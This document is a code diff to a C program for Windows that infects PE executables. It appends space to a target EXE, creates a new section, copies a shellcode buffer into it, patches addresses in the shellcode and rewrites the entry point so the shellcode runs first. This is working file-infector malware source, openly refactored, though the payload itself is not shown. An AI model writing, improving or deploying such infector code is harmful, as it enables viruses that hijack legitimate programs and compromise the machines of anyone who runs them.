@@ -74,6 +74,7 @@ PVOID get_code_cave_address(EXE_file* infected, PDWORD result_out, DWORD shellco
 DWORD add_file_empty_place(PCHAR file_name, DWORD size_of_appned, DWORD* result_out)
 {
     // Return the origianl file size.
+    size_of_appned = align(size_of_appned, USUALLY_FILE_ALIGN, 0);
     PVOID zero_buffer = calloc(size_of_appned, 1);
     int result = 0;
     HANDLE file_handle = CreateFileA(file_name, // open Two.txt
@@ -89,7 +90,6 @@ DWORD add_file_empty_place(PCHAR file_name, DWORD size_of_appned, DWORD* result_
         *result_out = ERROR;
         return 0;
     }
-
 
     DWORD original_code_size = GetFileSize(file_handle, NULL);
     printf("old file size is %d\n",original_code_size);
@@ -122,16 +122,12 @@ DWORD add_file_empty_place(PCHAR file_name, DWORD size_of_appned, DWORD* result_
     return original_code_size;
 }
 
-VOID update_infected_headers(EXE_file* infected, DWORD shellcode_size, PVOID codecave_address)
+VOID set_new_entery_point(EXE_file* infected, DWORD new_entery_point)
 {
-    DWORD new_entery_point = 0;
-    infected->infected_section->SizeOfRawData += shellcode_size;
-    DWORD code_addition_count = infected->infected_section->SizeOfRawData;
-    infected->infected_section->Misc.VirtualSize = code_addition_count;
-    ROUND_TO_SECTION_ALIGNMENT(code_addition_count);
-    infected->headers->OptionalHeader.SizeOfImage += code_addition_count;
-    infected->infected_section->Characteristics |= IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE;
-    new_entery_point = (DWORD)codecave_address + infected->infected_section->VirtualAddress - infected->infected_section->PointerToRawData - (DWORD)infected->mapped_handle;
+    // set new entery point to shellcode adderess relative to start of file (end of file).
+    new_entery_point = (DWORD)new_entery_point - (DWORD)infected->mapped_handle;
+    // change address to RVA.
+    new_entery_point += infected->infected_section->VirtualAddress - infected->infected_section->PointerToRawData;
     infected->headers->OptionalHeader.AddressOfEntryPoint = new_entery_point;
 }
 
@@ -143,7 +139,7 @@ int main()
     int result = SUCCESS;
     EXE_file* infected = NULL;
     HANDLE mapping_handle = { 0 };
-    PVOID codecave_address = 0;
+    PVOID infection_address = 0;
     int shellcode_size = 0;
     DWORD new_entery_point = 0;
     PVOID shellcode_buffer = NULL;
@@ -202,23 +198,17 @@ int main()
     */
     mapping_handle = CreateFileMapping(infected->handle, NULL, PAGE_READWRITE, 0, infected->file_size, NULL);
     infected->mapped_handle = (LPBYTE)MapViewOfFile(mapping_handle, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, infected->file_size);
-
     result = set_exe_headers(infected);
     if (result != SUCCESS)
         goto end;
 
-    /*codecave_address = get_code_cave_address(infected, &result, shellcode_size);
-    if (result == ERROR)
-        goto end;*/
-    codecave_address = infected->mapped_handle + infected->origianal_file_size;
-    // Last section address.
-    infected->infected_section = (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(infected->headers) + (infected->headers->FileHeader.NumberOfSections - 1);
+    create_new_section(infected, shellcode_size);
 
-    memcpy((LPBYTE)codecave_address, shellcode_buffer, shellcode_size);
-    set_addrress_in_shellcode(infected, codecave_address, shellcode_size);
+    infection_address = infected->mapped_handle + infected->origianal_file_size;
 
-    update_infected_headers(infected, shellcode_size, codecave_address);
-
+    memcpy((LPBYTE)infection_address, shellcode_buffer, shellcode_size);
+    set_addrress_in_shellcode(infected, infection_address, shellcode_size);
+    set_new_entery_point(infected, infection_address);
 
 end:
     if (infected != NULL)
